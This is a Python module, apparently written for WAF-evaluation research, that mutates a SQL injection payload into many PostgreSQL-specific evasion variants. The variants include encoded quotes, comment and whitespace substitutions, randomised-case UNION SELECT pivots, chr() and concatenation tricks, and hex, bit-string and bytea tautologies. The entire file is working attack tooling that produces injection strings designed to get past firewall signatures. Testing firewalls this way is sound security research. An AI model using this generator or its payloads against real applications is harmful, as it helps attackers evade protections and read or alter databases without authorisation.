import hashlib
import random
import re
from urllib.parse import quote, quote_plus


def _random_case_kw(text: str, rng: random.Random) -> str:
    """Randomly alternate upper/lower case for alphabetic characters."""
    chars = []
    for c in text:
        if c.isalpha():
            chars.append(rng.choice([c.upper(), c.lower()]))
        else:
            chars.append(c)
    res = "".join(chars)
    # Ensure it's not strictly all uppercase or matching the fixed 'UnIoN SeLeCt'
    if res in ("UNION SELECT", "union select", "UnIoN SeLeCt"):
        res = "uNiOn sElEcT"
    return res


def variants_pg(payload: str, seed: int | None = None) -> list[tuple[str, str]]:
    """
    Generate PostgreSQL-specific injection variants and WAF signature probes.

    Notes on PostgreSQL dialect:
      - Native PostgreSQL hex constants: X'...' or x'...' (hexadecimal bit-string constants)
      - Native PostgreSQL binary bit strings: B'...' or b'...'
      - Native PostgreSQL bytea: decode('4142', 'hex') or E'\\x4142'
      - MySQL-style 0x... hex literals do NOT execute in PostgreSQL, but are
        retained as 'waf_only' probes to evaluate WAF regex/signature bypass.
      - If seed is None: uses deterministic MD5-based seed derived from payload for 100% cross-process reproducibility.
      - UNION variants generated from an OR-only seed are explicitly prefixed
        with 'pivot_union_' to clarify cross-technique expansion in paper methodology.
    """
    if seed is None:
        # Deterministic 32-bit integer seed derived from payload via MD5 (Fix P1 Item 3)
        seed = int(hashlib.md5(payload.encode("utf-8")).hexdigest()[:8], 16)
    rng = random.Random(seed)

    out: list[tuple[str, str]] = []
    out.append((payload, "original"))
    out.append((payload.replace(" ", "+"), "plus_space"))
    out.append((payload.replace(" ", "\t"), "tab"))
    out.append((payload.replace(" ", "\n"), "newline"))
    out.append((payload.replace(" ", "\x0b"), "vtab"))
    out.append((payload.replace(" ", "\r"), "cr"))
    out.append((payload.replace(" ", "\x0c"), "ff"))
    out.append((payload.replace(" ", "/**/"), "comment_block"))
    out.append((payload.replace(" ", "%09").replace("'", "%27"), "tab_encoded_quote"))

    if "'" not in payload:
        return out

    prefix, rest = payload.split("'", 1)
    r = rest

    out.append((prefix + "%27" + quote_plus(r), "pre_plus_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "%09"), "pre_tab_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "%0a"), "pre_newline_encoded"))
    out.append((prefix + "%27" + r.replace(" ", "/**/"), "pre_comment_encoded"))
    out.append((prefix + "%2527" + r, "double_encoded_quote"))

    has_or = bool(re.search(r"\bor\b", r, re.I))
    has_union = bool(re.search(r"\bunion\b", r, re.I))

    if has_or:
        if re.search(r"1\s*=\s*1", r):
            out.append((prefix + "'" + re.sub(r"(?i)1\s*=\s*1", "true", r, count=1), "or_pg_true"))
            out.append((prefix + "'" + re.sub(r"(?i)1\s*=\s*1", "1=1", r, count=1), "or_pg_explicit"))
        out.append((prefix + "'" + r.replace(" ", "\n", 1), "or_first_space_to_newline"))

    # UNION variants (labeled with pivot_ prefix if expanded from an OR-based seed)
    if has_union or has_or:
        pfx = "" if has_union else "pivot_union_"
        # 1. Fixed mixed case
        out.append((f"{prefix}' UnIoN SeLeCt 1,2--", f"{pfx}case_mix"))
        out.append((quote(f"{prefix}' UnIoN SeLeCt 1,2--", safe=""), f"{pfx}case_mix_encoded"))
        # 2. PostgreSQL chr() function
        out.append((f"{prefix}' UNION SELECT chr(49),chr(50)--", f"{pfx}chr_pg"))
        out.append((quote(f"{prefix}' UNION SELECT chr(49),chr(50)--", safe=""), f"{pfx}chr_pg_encoded"))
        # 3. Dynamic randomized case (Fix P2 Item 11 & 12)
        rand_union = _random_case_kw("UNION SELECT", rng)
        out.append((f"{prefix}' {rand_union} 1,2--", f"{pfx}case_random"))
        out.append((quote(f"{prefix}' {rand_union} 1,2--", safe=""), f"{pfx}case_random_encoded"))
        # 4. PostgreSQL string concatenation
        out.append((f"{prefix}'||' UNION SELECT 1,2--", f"{pfx}concat_pg"))
        out.append((quote(f"{prefix}'||' UNION SELECT 1,2--", safe=""), f"{pfx}concat_pg_encoded"))

    # Hex & Dialect-Specific variants (Fix P2 Items 10 & 11)
    sample_text = "test"
    h = sample_text.encode("utf-8").hex()  # "74657374"
    h_full = (prefix + "'" + r.replace(" ", "#")).encode("utf-8").hex()

    # Valid PostgreSQL Native Hex (Bit-string constants X'...' and x'...') & Bytea
    out.append((f"{prefix}' OR X'{h}' = X'{h}'--", "pg_hex_literal"))
    out.append((f"{prefix}' OR x'{h}' = x'{h}'--", "pg_hex_literal_lower"))
    out.append((f"{prefix}' OR B'01000001' = B'01000001'--", "pg_bitstring_binary"))
    out.append((f"{prefix}' OR decode('{h}', 'hex') IS NOT NULL--", "pg_hex_decode"))
    out.append((f"{prefix}' OR 'a'=convert_from(E'\\\\x61', 'UTF8')--", "pg_bytea_escape"))

    # MySQL-compat Hex probes (labeled as WAF-only probes, invalid on PG execution)
    out.append((f"{prefix}' OR 0x{h}=0x{h}--", "account_hex_mysql_compat"))
    out.append((prefix + "0x" + h_full, "account_hex_prefix_waf_only"))
    out.append((prefix + "0x" + (h_full[:48] if len(h_full) > 48 else h_full), "account_hex_0x_partial"))
    out.append((prefix + "x" + h_full, "account_hex_x_waf_only"))

    seen: set[str] = set()
    deduped: list[tuple[str, str]] = []
    for p, name in out:
        if p not in seen:
            seen.add(p)
            deduped.append((p, name))
    return deduped
